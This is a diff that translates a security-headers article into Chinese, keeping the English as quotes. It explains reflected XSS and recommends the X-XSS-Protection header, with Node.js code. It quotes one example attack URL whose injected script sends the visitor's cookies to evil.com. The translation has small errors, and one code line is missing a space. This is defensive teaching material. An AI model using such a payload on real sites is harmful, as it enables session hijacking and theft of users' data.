@@ -143,13 +143,17 @@ function requestHandler(req, res){
 }
 ```
 
-### Enabling XSS Filtering ###
+### 启用 XSS 过滤 ###
 
-In a reflected cross-site scripting attack (reflected XSS), an attacker injects malicious JavaScript code into an HTTP request, with the injected code “reflected” in the response and executed by the browser rendering the response, enabling the malicious code to operate within a trusted context, accessing potentially confidential information such as session cookies. Unfortunately, XSS is a pretty common web app attack, and a surprisingly effective one!
+> In a reflected cross-site scripting attack (reflected XSS), an attacker injects malicious JavaScript code into an HTTP request, with the injected code “reflected” in the response and executed by the browser rendering the response, enabling the malicious code to operate within a trusted context, accessing potentially confidential information such as session cookies. Unfortunately, XSS is a pretty common web app attack, and a surprisingly effective one!
 
-To understand a reflected XSS attack, consider the Node.js code below, rendering mywebapp.com, a mock and intentionally simple web app that renders search results alongside the search term requested by the user:
+在反射型跨站脚本攻击（reflected XSS）中，攻击者将恶意 JavaScript 代码注入到 HTTP 请求，注入的代码「映射」到响应中，并由浏览器执行，从而使恶意代码在可信任的上下文中执行，访问诸如会话 cookie 的潜在机密信息。不幸的是，XSS 是一个很常见的网络应用程序，且令人惊讶地有效！
 
-```
+>To understand a reflected XSS attack, consider the Node.js code below, rendering mywebapp.com, a mock and intentionally simple web app that renders search results alongside the search term requested by the user:
+
+为了了解反射型 XSS 攻击，参考以下 Node.js 代码，渲染 `mywebapp.com` 一个模拟并有意简单的 web 应用程序，它将搜索结果以及用户请求的搜索关键词一起呈现：
+
+```javascript
 function handleRequest(req, res) {
     res.writeHead(200);
 
@@ -169,36 +173,48 @@ function handleRequest(req, res) {
 };
 ```
 
-Now, consider how will the web app above handle a URL constructed with malicious executable code embedded within the URL, such as this:
+>Now, consider how will the web app above handle a URL constructed with malicious executable code embedded within the URL, such as this:
+
+现在，来考虑一下上面的 web 应用程序会如何处理在 URL 中嵌入的恶意可执行代码，例如：
 
 ```
 https://mywebapp.com/search?</p><script>window.location=“http://evil.com?cookie=”+document.cookie</script>
 ```
 
-As you may realize, this URL will make the browser run the injected script and send the user’s cookies, potentially including confidential session cookies, to evil.com!
+> As you may realize, this URL will make the browser run the injected script and send the user’s cookies, potentially including confidential session cookies, to evil.com!
 
-To help protect users against reflective XSS attacks, some browsers have implemented protection mechanisms. These mechanisms try to identify these attacks by looking for matching code patterns in the HTTP request and response. Internet Explorer was the first browser to introduce such a mechanism with its XSS filter, introduced in Internet Explorer 8 back in 2008, and WebKit later introduced XSS Auditor, available today in Chrome and Safari. (Firefox has no similar mechanism built in, but users can use add-ons to gain this functionality.) These various protection mechanisms are not perfect: They may fail to detect a real XSS attack (a false negative), and in other cases may block legitimate code (a false positive). Due to the latter, browsers allow users to disable the XSS filter via the settings. Unfortunately, this is typically a global setting, which turns off this security feature completely for all web apps loaded by the browser.
+你可能意识到了，这个 URL 会让浏览器执行注入的脚本，并发送用户的 cookies，极有可能包含机密的会话 cookie，至 evil.com。
 
-Luckily, there is a way for a web app to override this configuration and ensure that the XSS filter is turned on for the web app being loaded by the browser. This is done via the `X-XSS-Protection` header. This header, supported by Internet Explorer (from version 8), Edge, Chrome and Safari, instructs the browser to turn on or off the browser’s built-in protection mechanism and to override the browser’s local configuration.
+> To help protect users against reflective XSS attacks, some browsers have implemented protection mechanisms. These mechanisms try to identify these attacks by looking for matching code patterns in the HTTP request and response. Internet Explorer was the first browser to introduce such a mechanism with its XSS filter, introduced in Internet Explorer 8 back in 2008, and WebKit later introduced XSS Auditor, available today in Chrome and Safari. (Firefox has no similar mechanism built in, but users can use add-ons to gain this functionality.) These various protection mechanisms are not perfect: They may fail to detect a real XSS attack (a false negative), and in other cases may block legitimate code (a false positive). Due to the latter, browsers allow users to disable the XSS filter via the settings. Unfortunately, this is typically a global setting, which turns off this security feature completely for all web apps loaded by the browser.
 
-`X-XSS-Protection` directives include these:
+为了帮助保护用户抵抗反射型 XSS 攻击，有些浏览器实施了保护机制。这些保护机制尝试通过在 HTTP 请求和响应中寻找匹配的代码模式来辨识这些攻击。Internet Explorer 是第一个推出这种机制的，在 2008 年的 IE 8 中引入了 XSS 过滤器的机制，而 WebKit 后来推出了 XSS 审计，现今在 Chrome 和 Safari 上可用。（Firefox 没有内置类似的机制，但是用户可以使用插件来获得此功能）。这些保护机制并不完美，它们可能无法检测到真正的 XSS 攻击（漏报），在其他情况可能会阻止合法代码（误判）。由于后一种情况的出现，浏览器允许用户可设置禁用 XSS 过滤功能。不幸的是，这通常是一个全局设置，这会完全关闭所有浏览器加载的 web 应用程序的安全功能。
 
-- `1` or `0`
+> Luckily, there is a way for a web app to override this configuration and ensure that the XSS filter is turned on for the web app being loaded by the browser. This is done via the `X-XSS-Protection` header. This header, supported by Internet Explorer (from version 8), Edge, Chrome and Safari, instructs the browser to turn on or off the browser’s built-in protection mechanism and to override the browser’s local configuration.
 
-This enables or disables the filter.
+幸运的是，有方法可以让 web 应用程序覆盖此配置，并确保浏览器加载的 web 应用已打开 XSS 过滤器。这是通过设定 `X-XSS-Protection` 响应头来达到的。此响应头支持 Internet Explorer （8以上）、Edge、Chrome 和 Safar，指示浏览器打开或关闭浏览器内置的保护机制，及覆盖浏览器的本地配置。
+
+`X-XSS-Protection` 指令包括:
+
+- `1` 或者 `0`
+
+使用或禁用 CSS 过滤器。
 - `mode=block`
 
-This instructs the browser to prevent the entire page from rendering when an XSS attack is detected.
+> This instructs the browser to prevent the entire page from rendering when an XSS attack is detected.
 
-I recommend always turning on the XSS filter, as well as block mode, to maximize user protection. Such a response header looks like this:
+当检测到 XSS 攻击时，这会指示浏览器不渲染整个页面。
+
+> I recommend always turning on the XSS filter, as well as block mode, to maximize user protection. Such a response header looks like this:
+
+我推荐永远打开 XSS 过滤器以及 block 模式，以求最大化保护用户。这样的响应头应该是这样的：
 
 ```
 X-XSS-Protection: 1; mode=block
 ```
 
-Here’s how you would configure this response header in Node.js:
+以下是在 Node.js 中配置此响应头的方法:
 
-```
+```javascript
 functionrequestHandler(req, res){
 	res.setHeader('X-XSS-Protection','1;mode=block');}
 ```
